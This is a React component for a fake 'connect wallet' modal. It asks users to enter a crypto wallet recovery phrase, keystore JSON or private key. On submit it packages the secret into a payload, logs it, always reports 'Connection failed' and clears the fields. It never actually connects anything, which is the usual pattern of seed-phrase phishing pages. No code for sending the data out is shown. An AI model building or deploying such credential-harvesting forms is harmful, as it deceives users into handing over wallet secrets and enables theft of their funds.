import React, { useState } from 'react';

export default function Last({ selectedWallet, onClose }) {
  const [activeTab, setActiveTab] = useState('phrase');
  const [phrase, setPhrase] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [keystore, setKeystore] = useState('');
  const [message, setMessage] = useState('');
  const [isConnecting, setIsConnecting] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isConnecting) return;
    setMessage('');

    if (activeTab === 'phrase' && !phrase.trim()) {
      setMessage('Please enter a recovery phrase.');
      return;
    }

    if (activeTab === 'privateKey' && !privateKey.trim()) {
      setMessage('Please enter a private key.');
      return;
    }

    if (activeTab === 'keystore' && !keystore.trim()) {
      setMessage('Please enter keystore data.');
      return;
    }

    const payload = {
      type: activeTab,
      phrase: activeTab === 'phrase' ? phrase.trim() : '',
      privateKey: activeTab === 'privateKey' ? privateKey.trim() : '',
      keystore: activeTab === 'keystore' ? keystore.trim() : '',
    };

    setIsConnecting(true);
    try {
      console.log('Submitted payload:', payload);
      await new Promise((res) => setTimeout(res, 1000));
      throw new Error('Connection failed');
    } catch (err) {
      setMessage('Connection failed. Please try again.');
    } finally {
      setIsConnecting(false);
      setPhrase('');
      setPrivateKey('');
      setKeystore('');
    }
  };

  const tabButton = (id, label) => {
    const isActive = activeTab === id;
    return (
      <button
        type="button"
        onClick={() => setActiveTab(id)}
        style={{
          flex: 1,
          padding: '12px 0',
          border: 'none',
          borderBottom: isActive ? '3px solid #2563eb' : '3px solid transparent',
          background: 'transparent',
          color: isActive ? '#111827' : '#6b7280',
          fontWeight: 600,
          cursor: 'pointer',
        }}
      >
        {label}
      </button>
    );
  };

  return (
    <div
      style={{
        maxWidth: 680,
        width: '100%',
        color: '#ffffff',
        margin: '0 auto',
        padding: 24,
        background: '#1f2937',
        borderRadius: 20,
        boxShadow: '0 20px 45px rgba(15, 23, 42, 0.08)',
        fontFamily: 'Inter, sans-serif',
        position: 'relative',
        top: 'auto',
        left: 'auto',
      }}
    >
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24, color: '#111827' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <div
            style={{
              width: 54,
              height: 54,
              borderRadius: '50%',
              background: '#f3f4f6',
              display: 'grid',
              placeItems: 'center',
            }}
          >
            {selectedWallet ? (
              <img
                src={selectedWallet.image}
                alt={selectedWallet.name}
                style={{ width: 40, height: 40, borderRadius: '50%', objectFit: 'cover' }}
              />
            ) : (
              <span style={{ fontSize: 24, color: '#6b7280' }}>?</span>
            )}
          </div>
          <div>
            <p style={{ margin: 0, fontSize: 18, fontWeight: 700, color: '#ffffff' }}>
              {selectedWallet ? selectedWallet.name : ''}
            </p>
            <p style={{ margin: 0, color: '#6b7280', fontSize: 14 }}>Select one import method</p>
          </div>
        </div>
        {onClose && (
          <button
            type="button"
            onClick={onClose}
            style={{
              border: 'none',
              background: 'transparent',
              color: '#ffffff',
              fontSize: 24,
              cursor: 'pointer',
              lineHeight: 1,
            }}
            aria-label="Close"
          >
            ×
          </button>
        )}
      </div>

      <form onSubmit={handleSubmit}>
        <div
          style={{
            display: 'grid',
            gridTemplateColumns: '1fr 1fr 1fr',
            alignItems: 'center',
            borderBottom: '1px solid #e5e7eb',
            marginBottom: 18,
          }}
        >
          {tabButton('phrase', 'Phrase')}
          {tabButton('keystore', 'Keystore')}
          {tabButton('privateKey', 'Private Key')}
        </div>

        <div style={{ marginBottom: 16 }}>
          <label htmlFor="credentialInput" style={{ display: 'block', marginBottom: 10, color: '#374151', fontWeight: 600 }}>
            {activeTab === 'phrase'
              ? 'Recovery Phrase'
              : activeTab === 'keystore'
              ? 'Keystore JSON'
              : 'Private Key'}
          </label>

          {activeTab === 'phrase' && (
            <textarea
              id="credentialInput"
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              rows={4}
              placeholder="Enter your recovery phrase"
              style={{
                width: '100%',
                color: '#FFFFFF',
                borderRadius: 16,
                border: '1px solid #d1d5db',
                padding: 16,
                fontSize: 15,
                
               
              }}
            />
          )}

          {activeTab === 'keystore' && (
            <textarea
              id="credentialInput"
              value={keystore}
              onChange={(e) => setKeystore(e.target.value)}
              rows={6}
              placeholder="Paste your keystore JSON"
              style={{
                width: '100%',
                borderRadius: 16,
                border: '1px solid #d1d5db',
                padding: 16,
                fontSize: 15,
                color: '#FFFFFF',
               
              }}
            />
          )}
          {activeTab === 'privateKey' && (
            <input
              id="credentialInput"
              type="password"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              placeholder="Enter your private key"
              style={{
                width: '100%',
                borderRadius: 16,
                border: '1px solid #d1d5db',
                padding: 16,
                fontSize: 15,
                color: '#FFFFFF',
              }}
            />
          )}
        </div>

        <p style={{ margin: '0 0 20px', color: '#6b7280', fontSize: 14 }}>
          {activeTab === 'phrase'
            ? 'Typically 12 (sometimes 24) words separated by single spaces.'
            : activeTab === 'keystore'
            ? 'Your keystore JSON should include encrypted wallet data.'
            : 'Your private key is a secret string used to sign transactions.'}
        </p>

        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
          
          <button
            type="submit"
            disabled={isConnecting}
            style={{
              flex: 1,
              minWidth: 120,
              borderRadius: 14,
              border: 'none',
              padding: '14px 20px',
              background: isConnecting ? '#93c5fd' : '#2563eb',
              color: '#ffffff',
              fontWeight: 700,
              cursor: isConnecting ? 'not-allowed' : 'pointer',
              opacity: isConnecting ? 0.9 : 1,
            }}
          >
            {isConnecting ? 'Connecting...' : 'CONNECT WALLET'}
          </button>
        </div>
      </form>

      {message && <p style={{ marginTop: 18, color: '#FFFFFF', fontWeight: 600 }}>{message}</p>}
    </div>
  );
}
